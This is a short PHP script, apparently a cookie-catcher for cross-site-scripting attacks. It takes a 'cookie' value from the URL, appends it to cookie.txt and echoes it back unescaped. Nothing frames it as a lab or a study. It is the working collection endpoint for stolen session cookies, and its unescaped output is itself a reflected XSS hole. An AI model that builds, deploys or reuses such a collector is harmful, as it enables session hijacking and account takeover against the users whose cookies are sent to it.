

<?php
error_reporting(E_ALL);
if(isset($_GET['cookie'])) {
	    echo " Cookie written: ";
        echo $_GET['cookie'];
        file_put_contents('cookie.txt', $_GET['cookie']);
		
		echo "<br>";
	    echo "<br>";

} else {
	
	 echo "<br>";
	 echo "<br>";
	 echo "<br>";
	 echo "<br>";
	 
	 echo " No Cookie found!";
	
	echo "<br>";
	 echo "<br>";
}

	
       echo " Copyright © 2018 Uday Mahajan, Anupam Gupta & Kushal Jhunjhunwalla.
  All rights reserved.";
?>